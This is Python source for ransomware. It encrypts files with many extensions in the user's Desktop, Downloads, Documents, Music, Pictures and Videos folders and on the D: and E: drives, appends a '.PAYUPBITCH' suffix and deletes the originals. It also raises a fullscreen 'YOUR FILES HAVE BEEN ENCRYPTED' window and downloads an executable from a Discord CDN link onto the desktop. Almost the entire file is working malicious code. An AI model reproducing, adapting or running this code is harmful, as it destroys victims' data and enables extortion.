import json
import os 
import random
import string
import base64
import urllib.request
import urllib
import tkinter as tk
from threading import *
from time import *
from tkinter import *
from ctypes import *
from urllib.request import urlopen
from time import sleep
from cryptography.fernet import Fernet as f
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
global appdata
appdata = os.getenv('APPDATA')


def password(passwd):
    
    password = passwd.encode() 
    salt = b'salt_' 
    kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
            )
    k = base64.urlsafe_b64encode(kdf.derive(password))
    return k

def enc_fun(key,file):
    try:
        with open(file,"rb") as fname:
            data = fname.read()
        fl,ext = os.path.splitext(file)
        fkey = f(key)
        enc = fkey.encrypt(data)
        with open(str(fl[0:])+ext+'.PAYUPBITCH','wb') as encfile:
            encfile.write(enc)
        os.remove(file)
    except:
        pass

def spam_messagebox():

    root= tk.Tk()
    width = root.winfo_screenwidth() 
    height = root.winfo_screenheight() 


    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') 
    canvas1.pack()

    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') 
    label1.config(font=('helvetica', int(height/20)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/15), window=label1)


    label1 = tk.Label(root, text='YOUR IMPORTANT PROGRAMS, DOCUMENTS, DATAS, PHOTOS, SCRIPTS, SOURCE CODE AND VIDEOS') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*6, window=label1)


    label1 = tk.Label(root, text='HAVE BEEN ENCRYPTED WITH HIGH GRADE MILITARY ENCRYPTION.') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*7, window=label1)

    root.attributes('-topmost', True) 
    root.attributes('-fullscreen', True) 
    root.mainloop()

def download_decrypter():
    NAME = os.getlogin()
    req = urllib.request.Request('https://cdn.discordapp.com/attachments/947224575622676520/966006697120378880/Decrypt_My_Files.exe', headers={'User-Agent': 'Mozilla/5.0'})
    f = urlopen(req)
    filecontent = f.read()
    with open(f'C:\\Users\\{NAME}\\Desktop\\Decrypt_My_Files.exe', 'wb') as f:
        f.write(filecontent)
    f.close()



PASSWORDS = []

# Encrypt C: Items, Desktop, Downloads, Documents, Pictures etc...
def C_drive_desktop():
    userdir = f'C:\\Users\\{os.getlogin()}\\Desktop'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Desktop Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def C_drive_downloads():
    userdir = f'C:\\Users\\{os.getlogin()}\\Downloads'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Downloads Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def C_drive_documents():
    userdir = f'C:\\Users\\{os.getlogin()}\\Documents'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Documents Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def C_drive_music():
    userdir = f'C:\\Users\\{os.getlogin()}\\Music'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Music Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def C_drive_pictures():
    userdir = f'C:\\Users\\{os.getlogin()}\\Pictures'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Pictures Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def C_drive_videos():
    userdir = f'C:\\Users\\{os.getlogin()}\\Videos'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Videos Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

    # Other Drives
def D_drive():
    userdir = f'D:\\'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'D Drive : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def E_drive():
    userdir = f'E:\\'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'E Drive : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def Start_ransom():
    print("Booting up auto encrypter, Please wait. . .")

    a = Thread(target = C_drive_desktop)
    b = Thread(target = C_drive_downloads)
    c = Thread(target = C_drive_documents)
    d = Thread(target = C_drive_music)
    e = Thread(target = C_drive_pictures)
    f = Thread(target = C_drive_videos)
    g = Thread(target = D_drive)
    h = Thread(target = E_drive)

    download = Thread(target = download_decrypter)
    message = Thread(target = spam_messagebox)

    a.start()
    b.start()
    c.start()
    d.start()
    e.start()
    f.start()
    g.start()
    h.start()
    download.start()
    message.start()

    a.join()
    b.join()
    c.join()
    d.join()
    e.join()
    f.join()
    g.join()
    h.join()
    download.join()
    message.join()

print(f"```Finished encrypted everything and sent message box```\n\n**Here are the keys to decrypt the files!**\n{json.dumps(PASSWORDS, indent=6)}")
